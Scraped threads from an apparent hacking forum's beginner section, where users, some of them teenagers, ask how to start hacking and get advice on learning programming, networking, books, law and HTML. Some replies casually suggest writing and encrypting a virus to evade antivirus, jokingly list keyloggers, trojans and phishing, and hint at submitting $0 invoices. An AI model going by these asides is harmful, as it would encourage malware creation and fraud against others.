As for learning computer programming languages for beginners, I can provide some tips.  Only read books about tutorials on a computer programming languages is of little use. You'd better learn by practice. In my experience, I study every one of computer programming language by writing at least 15 programs in this language. These programmes are not the ones such as "Hello world!". Each of them should be at least hundreds of lines. They can be an implementation of a specific algorithm programme fulfilling a definite calculation task. They can be an application performs some definite function as by calling some apis written in this language like video or audio related programmes. They can be a small game like Pacman or Greedy Snake. Nowadays it is impossible to master all the libraries and packages in every aspect written in one language due to their fast releasing speed. An amount of such practice should enable you to grasp the essentials of that language. When you are asked to write code in it, you are able to complete it by occasionally search its related apis on the Internet.

With a masters degree I would expect to see more HQ posts. Tell us something we don't know. What did you learn? I'm seeing just a bunch of buzzwords. Reading a book doesn't make you a master.   Based on what you basically narrated,  the only thing I see you learned is basically basic.    I agree with Infinital and Fullspeed, this guy is fake cool.

If you've read the books, then you'd know that the only true way to get rid of a rootkit is to ditch the drive. Anything else you do at your own risk. As far as calling the police, that is also valid if you're being harassed.  I also told you if you had hashes of files on the system, you could chance keeping those, but should still view them with a hex editor and do a side by side comparison.  Take the info as you will, but from what you posted previously to this one just doesn't add up entirely, or at least not in my own personal opinion.

So we are in "Beginner's Section", and I would almost 100% guarantee that if a new tech came to me and said "This computer keeps getting re-infected with root-kits, what do I do?"   My response would be "Did you wipe the drive and start fresh install?"

After taking a complete image of your harddrive and ram you need to move this to another machine to analyze with digital forensics tools such as volatility and enCase. Now, digital forensics and compromise assessment is pretty difficult so you're gonna wanna wipe your machine in the meantime as you study the subject competently enough to be able to extrapolate where the malware is on your machine, how it is working, and how it continues to reinfect you. This is also gonna require some serious reverse engineering so make sure you learn that too.

The possibilities are endless. I mainly program scripts to complete day to day security checks on my systems and automate scanning on a monthly basis. It is great since you don't waste time on repetitive tasks that could take up time. In infosec time is not in your favor.   When you say scripting for "hacking" purposes what do you mean? Running nmap scans then nikto or whatever (just an example) scans against a server if certain conditions are met? Or automated wireless auditing etc.
By hacking I meant stuff like scanning with nmap, and nikto, but to me I do not really see why you would make a script to use a pre-made tool. That is why I want to know what scripts can do in regards of reconnaissance, exploitation, and payloads that the tools made by others cannot. Thanks for the reply.

Many pre-made tools only have basic functionallity. With scripting you can expand on that. Run multiple tools at the same time, collect the information and store them in a better way(mysql perhaps?), generate summaries and much much more.
I see, so is the power of the script mainly only limited to the tools being used?
You might see it as being lazy, but scripts stop you from repeating the same task over and over and over and over and over and over... and over. I automate a lot of stuff, scanning with nmap, sql injections, saving the results to a document, scanning a range of ip's, sending emails to myself if the script finds anything while I'm not at the computer.
Quote by BullzI see, so is the power of the script mainly only limited to the tools being used?    Not sure I understood that. You are not limited to anything in the world of scripting and programming. You can do whatever you want.
In the programming world, it is believed better not to repeat what has already been done. So I can utilise say nmap to as far as it can handle then add custom code for other functionality. This is more common with bash or power shell, but with languages like Python, people do write there own tools in-house with these scripting languages.   Scripting ain't just about running system tools and automating the process, it is more and only limited by your skill and imagination.

Ok,   So basically, I've always wanted to learn how to hack. Not to do mean things to people, but just for myself. I am 15 years old and aspire to become a white hat hacker someday, only problem is I dont really know where to start. I've searched online for hacking tutorials, but they dont really teach me anything.   I found this site and thought that I might aswell ask because I realy want to learn how to hack, any help would be appreciated .   Thanks

Thanks   Hello Cyberzize,   good thing to hear that you want to become a white hat, really!   Alright, where to start is the biggest "problem" for every begginer.    Even though you want to become a white hat sooner or later you have to start with programming. Why you might ask? Well, because it is defenitely neccessary.   If you want to later play around with stuff that could harm, you need to know how that stuff all works.    What language you should start with? Honestly, it somewhat depends on you. If you want a smoother introduction to programming, I can totally recommend you Python because it's a strong language but very easy to read. It's even somewhat beautiful to read  Otherwise I could recommend you C++ or C#, personal preference really.     What to do once you've got some skills in coding? Well, program. Make yourself some programs that you think will be either useful for you or somewhat useful for people in the internet, hell, even do them if they're not useful at all because you're still learning and EVERY program you make will give you experience. If you need ebooks, tutorials or whatever, feel free to contact me through Email or Skype, I will be happy to provide you with stuff. (Email: zynklap@gmail.com // Skype: ene.tuta)     So, let's say you're a somewhat okay coder, now I would say you should learn how different types of viruses work, for example search up very famous ones and research what they and how they did it. Then learn how AV (AntiVir) work. Try to make your own Virus and try to maybe even crypt it, just for the sake of learning how the stuff works. Then you could try to get into computing, like, cleaning a PC, removing viruses by yourself and all that.    Once you've reached that state.. you'll know what to do next by yourself  Have fun and NEVER EVER give up!                        Edited by Zynklap. (Wednesday 3rd of August 2016 01:21:41 PM)
Wow thanks so much for the feedback!   Okay, I should've mentioned this earlier, but I already have some knowledge of python programming. I've gotten to the point where I have made my first questionnaire on it which calculates score averages etc. Anyway, my point is I dont really know what I want. I have like 100 questions! I know that hacking is a massive subject and it sort of intimidates me, what I'm trying to say is that I would like to know what I can do with my computer in terms of hacking because i feel so clueless atm. Is it possible if you could help me? xD   Thanks!

At the same time, don't let it narrow you into a single ideology because not every hacker is going to fit under that personality type.  http://www.catb.org/esr/faqs/hacker-howto.html#why_this
I've only recently started delving into this sort of thing a bit more seriously. I managed to get Kali Linux and promptly began practicing the terminal commands to get a better idea of how to navigate and manipulate the system and such.   Put short, I'm near oblivious except for a moderate portion of the terminology and some unrelated coding experience (Perl, HTML).   You mentioned to practice with coding, studying up on AV, known viruses, then later use that knowledge to develop your own tools. I guess my question is: Where does pentesting come into play and do you have any recommendations to begin picking up on it -- or should that be something best learned at a later time?

Hey guys. Was wondering if some one could list a few topics to research, entery level skills to learn.
Of course, first I would learn a scripting language since they're very easy to code with and are relatively useful for pentesting,  I would start either with Ruby or Python, along with that I would learn some theory about networking, after you have "Mastered" programming with those I would learn command line which is very important too. At least that has been my path so far, after learning command line you can pretty much learn whatever you want, like him,  css,  php for websites security,  networking to find vulnerabilities,   if you want to develop mal wares you can learn a low level programming language like C and learn Windows api.  And that's it, the possibilities are endless, you'll find the way by your own.

I would like to add that networking is the fundamentals, because you can know how to code tools to scan for the lates CVE's or scripts to auto-exploit network vulnerabilities. If you don't understand what layer you want to target or how the data gets yo the target, you are blindly attacking a network with potential risk to bring down systems. If you were to get in to the habit of doing this, and landed a pentesting job, you could bring down enterprise servers, and your company's reputation would take a big strain. Some clients want you to try and bring down the servers,switches or even just the application, but most clients I have worked with are not fond of it when you take down a key server etc.
Quote by mathmayHELLO WOULLD YOU HELLP ME TO TRACK A CELL PHONE    There are tons of applications for that. What OS are you using? I know with Android you can actually track your phone through your google account... I also use McAfee on my phone. If anyone tries to unlock it, it sends me an email with a picture of the front camera and the GPS coordinates.   What are you trying to accomplish? Do you want to be able to track it if it's stolen/lost? or someone authorized is just "using" it and you want to keep track of it?
Quote by FullSpeedQuote by beginner2125ermy socail media account has been hacked and i need to get my password , is there away to obtain my password hash from the website   Not suspicious at all     I know right. Any logical person would just contact them and have the account locked, and reset the password.     However, in theory if I forgot my password and had access to my computer, I could use a key logger in hopes that I log into it in my sleep (remembering the password of coarse) lol . I could also try to get myself to install a Trojan with a key-logger, or steal my cookie(assuming that they are always logged in) ... or I could run a spear-phishing campaign on myself with a credential harvesting site.... all this is just theoretical of coarse.   But if this is a major social media site, and not some small one, they likely have fairly good security practices and I would focus on attacking the client (myself  )...

Thanks-   You don't want to be a Cyber Threat Analyst. They are an intelligence-operation fusion branch focused on defensive counter-measures. They don't do really any hacking. My suggestion is go with the NSA if you want to go down that road. Specifically look at the CNO (Computer Network Operations) developmental program. You are very young, and if you apply yourself now, you could easily get yourself accepted into this program. It's a 3 year pipeline where they will teach you about everything you could dream of when it comes to hacking. After the program is over, you will specialize in one of the areas... If you get through this program you are basically set for life... there is a lot of demand for the skill sets that you will aquire. Not to mention that you will have a Top Secret SCI clearance and a Full-Scope Polygraph. Good luck!                       Edited by CND_Monkey (Thursday 11th of August 2016 02:53:28 AM)

Well i just got on this site recently and ive been looking through a few ways on how to get started. Ive been looking at python and started learning that. The only thing that im not really understanding is how to do the entire hacking thing. Like what programs would you use for getting into your own systems and checking how well theyre protected? i dont really get the concept of how im supposed to do that.. is there like a tutorial or anything?
Once you learn to program you kinda understand how systems are built, coded, deployed, etc. Via common misconfiguration issues and common insecure coding practices you start to think of potential holes in the system. from there you leverage your programming skills and knowledge of computers to build tools to help automate certain attacks.   While many tools are already made available to people, if you just use tools without understanding how they work you'll never really learn to hack
So is it all self taught? Isn't there like a tutorial on how to make programs to get into systems and all that?
Not particularly, a lot of it is personal research. Once you learn general vulnerability classes you start to understand how to take advantage of certain vulnerabilities
I'm not new to the idea of hacking - just the techniques for testing/exploitation. Hacking is as much a mentality as it is a specific set of skills. If you rip something apart that is not made to, if you re purpose one thing to another, if 'no' is never a sufficient answer then you've got a great start for hacking already. ¢2 Hope it helps the rest of the would be's with a heart full of curiosity.
Quote by markopolo62So is it all self taught? Isn't there like a tutorial on how to make programs to get into systems and all that?   Hacking ain't magic, and it ain't 1980's anymore. Damn systems are to a great extent secure that you need to leverage a number of minor, or not, vulnerabilities sometimes to get into a system.   Or you could just find a new vulnerability tomorrow then write a script to crawl the Internet's own them machine. Look out though, ifbyou ain't owning the IoT, well maintained systems will land you in trouble.

So to make a workable <a id="link">This is another link</a> tag, does the anchor tag have to have say a h1 or something inside in order to make it a working link?  staff note: format your posts.

Put code inside [code] tags.   You create links by using <a> tags. Heading tags (<h1>, <h2>, ... <h6>) have nothing to do with it. That was the question, right?                       Edited by Kurajber (Friday 30th of September 2016 03:36:43 AM)
No sorry, im going through a basic tutorial. And its teaching me to make links, my question is, the text that the link is connected to, can it just go in between the <a> tags, or does there need to be another tag inside of the <a> tag to create the text? I'm new to all of this, so i apologize if im not wording it properly
When i go it in the website, <a id="link">This is another link</a> the "this is another link" text doesnt show up on the page at all.

No, Code<a href="www.google.com">link</a>            .CodeMirror {height: auto;}      var element = document.getElementById("code-BV2xl01BVW");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });      will display the code as a normal hypertext, just like the letters in my message right now, except as a link. If you decide to wrap it with a h1, it will output the same link with the same hypertext, except formatted according to your H1 css rule.   You can type in HTML without any tag and it will be a valid input, if you happen to decide to wrap your text in a tag, the effects of that tag will be applied to whatever is inside, including other tags.   You can easily test these doubts in one of the many online HTML environments.

Ah, I understand. Well, under most circumstances you'll have a link inside a paragraph, or inside a heading, or a list, or whatever. So, it's the other way around, your <a> tags should be inside the <h1> or <p> or whatever.   Example:  Code  <p> To visit my awesome site, click <a href="other_page.html">here</a>. </p>    <h1> <a href="other_page.html"> This is the link in heading. </a> </h1>            .CodeMirror {height: auto;}      var element = document.getElementById("code-t5T1twYhDZ");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        EDIT: For a moment, I thought I understood what you wanted.   EDIT 2: Put <p> </p> tags around your <a> </a> tags and see what happens.                       Edited by Kurajber (Friday 30th of September 2016 03:50:00 AM)
Ahhhh ok i see the mistake,  but how come on the h1 and anchor tag that one says ="link" not href?

Very true and I really do appreciate your input. But it's been statistically proven that human interaction drastically increases learning patterns and progress. I'm speaking with multiple sources and reading multiple sources hence why i'm constantly asking questions.

@Selhar, mister, please don't rage unnecessarily.   @Algorethm, I'm really trying hard to understand you, but your English is pretty bad    I suppose you're asking about this:  Code<a id="link">            .CodeMirror {height: auto;}      var element = document.getElementById("code-Ut5nVVbbWK");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       Here you're not making a hyperlink, but making a reference to this particular element, which is useful for CSS and JS which you'll probably learn later. But it is made there so it can be referenced here:  Code<a href="#link">Team Members</a>            .CodeMirror {height: auto;}      var element = document.getElementById("code-ps8YuKMBmB");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       When you click on that link it'll "scroll" for you to the element with the id "link".

I did, read the forum. I got stuck at a part, and i couldnt type how come on the h1 and anchor tag that one says ="link" not href?. That wouldn't come up with an accurate search.
Ya i ended up figuring it out after, appreciate the help! My first language is english haha im just having a hard time writing down what i mean when it comes to coding language, its all very new to me. But its starting to come pretty quick. The first day was super confusing. You wrote what i meant in your last post. Thank you!

I'm not here to offend anybody, Ive been using tutorials and reading an abundance. I do understand it's probably super annoying having to answer the same questions from beginners. A friend of mine is giving lessons and usually answers the questions I need, but this community has such a wide variety of perspectives and knowledge and he wasn't able to help me at the time and i didn't want to stop learning hahaha but I was helped with the issue I had and I appreciate it!
Code: html  <h1><a id="link"></a>Crushed Smokes</h1>              .CodeMirror {height: auto;}      var element = document.getElementById("code-Ku8tQd4lrz");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/html",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        I don't quite understand the question but the issue might be because you closed the link early.   And in order to make the link clickable, you have to have the href attribute, whether you leave it empty or not.   So should be something like this: Code: html  <h1><a id="link" href="www.path.to/your/link">Crushed Smokes</a></h1>              .CodeMirror {height: auto;}      var element = document.getElementById("code-9lg8LTpM4f");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/html",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        You also don't need to have the id attribute. It doesn't do anything in HTML. It's mostly used in JavaScript or CSS. It does one thing in plain HTML to scroll to some part of a page.                       Edited by shady (Friday 30th of September 2016 06:23:07 AM)
Ya I got confused about the class and id, elements I believe they are called as in what they do.I learnt about href and all these a couple days ago, so im still formatting how the language works in my head. And since im still learning the basics im trying not to delete earlier code i learnt in the tutorials so I can get a feel of what making a full page actually feels like, so the whole hierarchy thing was confusing me on how to target certain tags or texts. A buddy of mine sat down and was showing me the difference and that id tags are barely used in the html text. Then he decided to show me some php and that's when my brain started hurting hahaha one day though. I'm still having a difficult time explaining what I mean and I apologize for that, but you answered it correctly as well, basically I wasnt sure if i could make a link and needed a separate tag like an <h1> tag as well to create the text. I wasnt sure if i could just place the text i wanted the link to be inside the anchor tags alone, and i had scewed around with some of the background and font colors so i couldn't see the text at first. Thank you everyone!                       Edited by Algorethm (Friday 30th of September 2016 08:39:22 AM)
Hey everyone, i'm knew to the scene but have recently been learning the basics at HTML and CSS. Should be starting a project myself in the next couple days to toy around with everything I don't know. My question is after I feel competent with these languages, what would be a good language to start learning next? Not necessarily relevant to hacking, but a good one to point me in the right direction to learn coding and hacking at some point. Got a really cool idea to work on, hence the reason I want to learn how to do all of this. A friend of mine was in the progress of figuring out how to create a downloable open-source government program, for situations like Iceland or any other countries that don't feel they are getting the correct political encouragement. Would be a lot of work, but could prove to be super beneficial. Let me know thoughts, ideas or whether you think it will work or not.

Try Harvard's CS50. It's online and free, gives you a broad introduction to computer science as a whole.
Awesome, appreciate that. Im literally new to the whole scene of coding but have always had an interest in it. Than a buddy of mine started talking about this idea and a bunch of others he had. I'm a little upset with myself i didnt start learning earlier.

Cheers    Algor3thm  I would suggest you to really understand HTML and CSS to its core (HTML 5 & CSS3). Then, you can move to bootstrap and see how things work out there. It's a framework that makes things easier. For instance, that framework is built in a way that the project you are working on will work on all resolutions and devices.
I'd recommend looking into some programming languages as well. I'm guessing you're into web development, so in that case, I'd recommend learning Javascript and PHP. Codecademy.com is a nice place to start:  https://www.codecademy.com/learn/javascript https://www.codecademy.com/learn/php         Edited by jyggorath (Thursday 29th of September 2016 06:03:43 PM)
Thanks, I just started learning development. Always been a  huge supporter of Aaron Swartz and the revolutionary developers we've had. Geez I wish i started learning earlier, seems I have a heck of a lot to go over! Anyone think a project like that could work?

Geez I wish i started learning earlier, seems I have a heck of a lot to go over! Anyone think a project like that could work?    You don't have to go directly start a project. You have to grab the basics first. I mean, we could give you a bunch of projects but you'll have a hard time with it and might even leave you depressed and end up vowing never to go back to that language again. But it all comes down to personal preference. Good luck.
I learn first hand the easiest I've noticed, a buddy of mine is giving me lessons just on html5 and CSS3. But i want to learn more faster hahaha I'm hooked I guess you could say haha.
I imagine majority of you are using linux correct? I'm sure im gonna get laughed at for this, but i'm still on windows lol If this field is something I want to progress in, is it better to start learning and using linux now or wait till i have a little bit more knowledge.
Honestly, I agree with Shady here, you need basics and to be solid in those before moving on. Your Windows choice doesn't end the world, as most corporate client targets are on Windows, however, the choice of *nix is a good thing to get used to for tools that will help you work on and get further into the field.

Linux will make your life easier. Most books and guides expect you to use linux, specially for low-ish level languages, and definitely for assembly. But as previously mentioned, it highly depends oh what you want to do, so as usual it's best left for you do judge. You can always use linux and have a windows VM and vice-versa.

The problem with your question is that you're treating this forum as if it was a(free) restaurant.  "I'm willing to be served, this is what i want to eat, now feed me my minions".  Jesus christ man that's really offensive and frustrating, it just shows that you're not putting in any effort and you will likely not give much of a shit to the answer that someone studied weeks to get. I'm sorry that sounds really rude, but at least it's how i feel, if you're not willing to do your own research, why would anyone bother helping you? You'll only come back asking for more later on, and that's not constructive for anybody.   Every single day a whole lot of people come through asking questions like "how do i hack" or "how do i install a keylogger", and sometimes a blessed soul takes the time to actually answer, and then you know what happens? These people vanish, because they don't give a fuck about anything else besides having their easy answer, and that's really fucked up man, coming to a place just to take something away.

What area of hacking interests you? Hacking is pretty diverse and there is Application Security, Reverse Engineering, Malware Analysis, Programming, Exploit Development, etc.

I'm going to take a wild guess you are not American, so I will give you a few resources. In America, we have what's called the Health Insurance Portability and Accountability Act which basically covers everything and anything about protecting patient records, both physically and electronically. To get more acquainted with best practices you can start from the wikipedia article on it, and branch out from the references if you want to get more in-depth with it:  https://en.wikipedia.org/wiki/Health_Insurance_Portability_and_Accountability_Act   Next, there is the Computer Fraud and Abuse Act. It's extremely broad and gives too much power to the government for hacking-related offenses in America; however, they do set some decent expectations for what is acceptable and not acceptable use of computers. It can be an enlightening read, and there will most likely be stipulations that apply in your own country (assuming you're not from some bumfuck lawless country like Iraq).  https://en.wikipedia.org/wiki/Computer_Fraud_and_Abuse_Act   The third, and final wikipedia article I'm going to refer you to is the Privacy Act of 1974. Again, it's a pretty dated piece of legal literature that gives too much power to the government, but at the same time, there is enough gray area that when used correctly, does a pretty good job at protecting the rights of the citizen.  https://en.wikipedia.org/wiki/Privacy_Act_of_1974   The three wikipedia articles I've listed above will give you a good overview of the areas you are wanting to get into, and are the cornerstone litigation documents for cyber and information protection laws in America. These three documents are pretty much the foundation of everything concerning cyber and personal protection mechanisms bound by law. Really good reads if you are serious about getting involved with policies.   ==Books==   I don't have links to any of these books, but they are also good reads for policy/basics of computer security, and well worth the read if you are starting your journey of knowledge from nothing:   "Security+ Get Certfied Get Ahead SY0-301 Study Guide" by Darril Gibson.    It's not very technically in-depth, but does give a good foundation for cyber security concepts if you don't know anything. It's very well written and easy to understand. This doesn't go as in-depth on the policy side either, which makes it tolerable to read for long periods, because you're not always ready about policy. It covers a good amount of foundational concepts spanning from operating systems, computer networking, hardware, security appliances, cryptography, and very very lightly touches some hacking concepts. You probaby won't pass the Security+ certification exam by only reading this book, because CompTIA has somewhat stepped up their game with the exam in recent years, and do require a little bit of hands-on knowledge (firewall rules as one example). They give you a good introduction to some of the business models that are frequently used in private and government sectors, and you will have a decent foundation.   "Computer Incident Response And Forensics Team Management" by Leighton R. Johnson. I actually attended a class based off of this book that was taught by Mr. Johnson himself. Really really fucking good book that goes deep into cyber law and best practice policies for incident response. Mr. Johnson is a really cheerful guy, really fucking intelligent, and I had a great time learning from him. This can be an extremely dull read if you're not into policies/law, but since you expressed interest in that area, this would definitely be the book for you.   That's probably all of the resources I can think of off the top of my head that you might be interested in.                       Edited by jyggorath (Wednesday 28th of September 2016 09:01:27 AM)
I'm going to take a wild guess you are not American, so I will give you a few resources. In America, we have what's called the Health Insurance Portability and Accountability Act which basically covers everything and anything about protecting patient records, both physically and electronically. To get more acquainted with best practices you can start from the wikipedia article on it, and branch out from the references if you want to get more in-depth with it:  https://en.wikipedia.org/wiki/Health_Insurance_Portability_and_Accountability_Act   Next, there is the Computer Fraud and Abuse Act. It's extremely broad and gives too much power to the government for hacking-related offenses in America; however, they do set some decent expectations for what is acceptable and not acceptable use of computers. It can be an enlightening read, and there will most likely be stipulations that apply in your own country (assuming you're not from some bumfuck lawless country like Iraq).  https://en.wikipedia.org/wiki/Computer_Fraud_and_Abuse_Act   The third, and final wikipedia article I'm going to refer you to is the Privacy Act of 1974. Again, it's a pretty dated piece of legal literature that gives too much power to the government, but at the same time, there is enough gray area that when used correctly, does a pretty good job at protecting the rights of the citizen.  https://en.wikipedia.org/wiki/Privacy_Act_of_1974   The three wikipedia articles I've listed above will give you a good overview of the areas you are wanting to get into, and are the cornerstone litigation documents for cyber and information protection laws in America. These three documents are pretty much the foundation of everything concerning cyber and personal protection mechanisms bound by law. Really good reads if you are serious about getting involved with policies.   ==Books==   I don't have links to any of these books, but they are also good reads for policy/basics of computer security, and well worth the read if you are starting your journey of knowledge from nothing:   "Security+ Get Certfied Get Ahead SY0-301 Study Guide" by Darril Gibson.    It's not very technically in-depth, but does give a good foundation for cyber security concepts if you don't know anything. It's very well written and easy to understand. This doesn't go as in-depth on the policy side either, which makes it tolerable to read for long periods, because you're not always ready about policy.

Depends.   What are your goals, what is your current knowledge, how much are you willing to wait for your first job? What kind of hacking do you have in mind? Do you need to go to college, or are you willing to study by yourself realistically?
You realize you're on a hacking forum, right?   Hang around here, read tutorials, participate in programming challenges, join IRC to meet some of the more active members, and enjoy yourself.
Well Iv got many years free time which is a good advantage for me (So alot of time to learn these things).   I don't exactly have any knowledge on these things in depth and I know I have to start somewhere, but Im not familiar with the terminologies and what the things I want to do come under, Not sure what it exactly comes under if it comes under programming, networking or what ever really. Goes to show I don't even know those things lol.  But as Iv said, Iv got alot of free time and Im asking this because I don't want to spend the next 1 - 2 years learning something and I find out Iv been trying to learn the wrong thing that doesn't really lead to my goals of hacking lol.   Mostly I wanna learn what others usually bring up -  ddosing  creating botnets / rats  getting personal info -usernames, passwords, ect. (Not an essential need but it be a useful skill to have in my backpocket)   Sorry for sounding really newbie, but any idea on where I can start for these things? I don't mind sitting down all hours of the day reading and learning, experimenting, ect. Lots of years of free time.
If you have free time as you said, I think you should start from programming. Programming is very important so that you don't be like one of those script kiddies.   Programming gives you the basic concepts about computer and security. Then you can create your own tools to hack.  Quote by OldMartialArtsQuote  If you know how the body works, you know how to defeat it.   Same goes to computers.
Thanks alot, Should I first get into python or c/c++ ?
Quote by Visual443Thanks alot, Should I first get into python or c/c++ ?  You should stop asking what you should do and actually do something.
Some languages like Python or Perl are easier to understand than C or C++. So I would recommend one of them first.  There is also some website where you can legally practice your hacker skills.

You talk in a way that makes you seem like a kid. It is also hard to understand what you are trying to say.  Try to work on your writing skills.    Anyways, hope you find what you're looking for and have fun.          Edited by truecam (Tuesday 27th of September 2016 03:33:10 AM)
thank you truecam  im writting like this because im not very good at english and  2nd i tried to give a humoristic welcome ^^  so im gonna make it more particular...to learn a language its a good start or smthng?  and if its a good start what language i must learn? basic?c? i saw that c++ its dificult for starters   and i found android difficult too you think thats not difficult and i must try more? or i must start from basic?
I would recommend learning assembly language first, but it really depends what do you want to write, every language is good for something, some are more practical than others depending on what do you want to write, app, exploit, web app etc...

[size=5]hi!    I'm 15 and I've pretty much always likes computers, tech etc. I'm doing Python in school so have some knowledge on that and we're moving onto MySQL sometime soon.    I'm here because i REALLY want to learn to hack, I'm patient and so I would be able to keep to a schedule or something and I'd put a lot of effort into it. I do not know where to start. I heard that i should install KALI LINUX but that's about it. I don't know about decoding and all these md5 codes, binary or what languages to use etc. I also seen a qr code on this site and it said to crack it but i dont know how to do that either.   What id really like to be able to do eventually is hack accounts, access blocked websites in school, know all about proxies, security, servers, controll computers wirelesy, decoding/encoding, keeping my things secure, femtocells and also be able to hack without using websites/software to do it for me. So i can essentially write my own hacks/malware etc.   I know this is a lot to ask but i hope some people could teach me on here. link me to other forums/sites, or maybe even message me so we can keep in touch and chat about things. I'm willing to work VERY VERY hard at this i just need to understand more and know what to do.     Thanks for any help and i hope i could maybe make a friend or something on here too who i can chat to and get help     EDIT: when i say schedule i dont mean i want someone to make me one i meant i'd be able to make one for myself and stick to it. Like a learning plan, kinda.                        Edited by O_PAR (Monday 26th of September 2016 09:05:10 PM)
If you really want to learn you should actually go and learn. Watch the posts, read the books, practice. Nobody can make a routine for you.    You shouldn't install anything because someone told you to. Study, when you feel the need to install anything, then you do it because it's the next step in your learning process. Following tutorials step by step will be meaningless, you won't learn anything besides following those steps.   Nobody will teach you anything relevant for free, because that takes time and effort. You have put little to no effort in your question, you're asking for someone to sit you down and point you in the right direction. This forum is already the right direction, figure out your own path as everybody else does. It's not easy, but it's not as hard as you probably think.   Also talking about "a friend who can help you" is quite a load of shit, you only want help and you know that, don't try to disguise it as friendship. Be honest, it's the least anyone expects of you. Browse the forums and you'll find this same question asked and answered many times, if you can't be bothered to do that, nobody should be bothered to help you.

I don't know why we go in this never-ending loop. Questions like "where to start". And the worst thing is we can't do nothing about it because there's really no one to blame.   Anyway, you mentioned that you know the basics of Python. That's good. Get a good grip of Python, but not by reading dozens of  books and PDFs. After you get the basics of any language, stop reading (cramming functions and keywords) and start a project, dive in deep to learn and explore for more.   Hacking isn't about knowing how to use a proxy or knowing to decrypt encrypted data. Any script kiddie can do that. Hacking is primarily about asking "what if".    A person knows what "ping" does in the cmd/terminal. Ping is a command used to send packets then get response in order to know if that server/website is live. Next, that person wonders "What if I use ping from different computers targeted to one website to create traffic?" That's what it's called DDoS.
Hi, Thanks for the info.    I see what your saying. I guess i didn't know what to write as i wasn't sure how people on the forum would react to a newbie
Quote by O_PARHi, Thanks for the info.    I see what your saying. I guess i didn't know what to write as i wasn't sure how people on the forum would react to a newbie    It's not about you being a newbie or not. It's about attitude. You're expecting people to give you a lot for free, when you could answer your own question by a quick, 5 minute research.
Well what should my attitude be like? i wasnt just expecting people to tell me what to do i like learning. in fact i'm doing research now on how to ddos. i just wanted some tips. How did you start hacking?
My end goal i think is to be able to discover vulnerabilities and write code to exploit them, and i will work hard to get there.
Quote by O_PARWell what should my attitude be like? i wasnt just expecting people to tell me what to do i like learning. in fact i'm doing research now on how to ddos. i just wanted some tips.  Being self sufficient is enough. You're in a forum about hacking, why not read the other posts in the beginner section and reach your conclusion? People just expect you to think for yourself. You can ask anything, as long as you tried to answer the question by yourself before asking for someone else's time.  QuoteHow did you start hacking?   Researching, finding study material, studying this material, practicing, repeat.
okay i'll take a look at some other posts. i'm just curious, what was your first hack?
Quote by O_PARokay i'll take a look at some other posts. i'm just curious, what was your first hack?   Taking down the world trade center. You're missing the point, this isn't school. Go study and do whatever seems fun to you.
New members be like: Codefor(;;) document.write("HOW TO START?");            .CodeMirror {height: auto;}      var element = document.getElementById("code-8jF2joYFQF");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });
I get that it isn't school. This is what interests me and i wanna be able to do it. you say to google it but thats the thing. i dont know what to google? if i search how to hack it displays nothing usefull. if i was to search how to DDOS then it would show something usefull.  But since ddosing is the only hacking term i know its the only thing i can google.  if i knew different things involved in hacking then i could research that and learn by myself. But i don't, so i cant google that.

I have search a lot no clue, no hints, no tips, nothing i mean nothing. until i found this site/forum I started reading as quest for some time to see if there will be any difference from others truth be said u guys are awesome, I really love u guys, always trying to make nothing to be something thanks again sorry for my poor english.
Well you didn't mention anything like a programming/scripting language, so I would say choose one. Since you are one for quick results and know squt, I would probably say python or ruby.   The term you are looking for is web scrapping, crawling and aggregating. Look through those as you learn the language.  Learn to parse HTML using different techniques and finally different libraries.  Post your relevant beautiful scripts here for other people to learn from or if you think someone else here will find them useful.   Go hack some code.   Regards.

For anything and everything related to website security, read The Web Application Hacker's Handbook 2nd Edition
Thank you so much, thats exactly the stuff I'm looking for. Slightly off topic but is it wise to begin with mostly web security exploits/defenses since it's kind of acts as a vector for most the other system exploits?
I recommend reading web penetration testing with kali linux 2nd edition.
Quote by ic3xr00tI recommend reading web penetration testing with kali linux 2nd edition.  I wouldn't recommend so. This is a tool oriented book that doesn't explain a lot about the subject matter and just strives to cover a lot of tools in Kali and how to point and shoot yet you can even load a gun.   I suggest read the book recommended NY @x_X, coupled with  hacking:the art of exploitation which will cover basically the system exploitation bits with a whole lot more. For a book in print though, I would request you look out for The hacker's playbook which is also good.   You will still not be able to exploit anything unless you actually setup a webserver locally, setup afew vulnerable apps and exploit them.   Practice,armed with knowledge of where to look will be your weapons of trade.  Not book or article will ever exhaust any one subject, so google and learn more and more from different articles, which will be easier when you chose a niche to focus on. But try everything for now.
Yeah I felt like a child playing in a landmine field with Kali because the tools are so powerful. Just want a more solid foundation and both those books look like they fit that bill so I'll definitly give them a read. Thanks for the suggestions

There are ways to submit $0 invoices but typically the company will notice this before they actually ship it out to you
There are things that are given away for free, for some reason (always look upon if someone reacted if it is a scam) but yet, all they charge is shipping. I mean, let's get real, there is nothing that someone will give you free, which costs him money to ship it to you. You are the one who pays that if article is free. Also, if you really want free stuff, why not torrent? But if you are more into physical type of stuff.
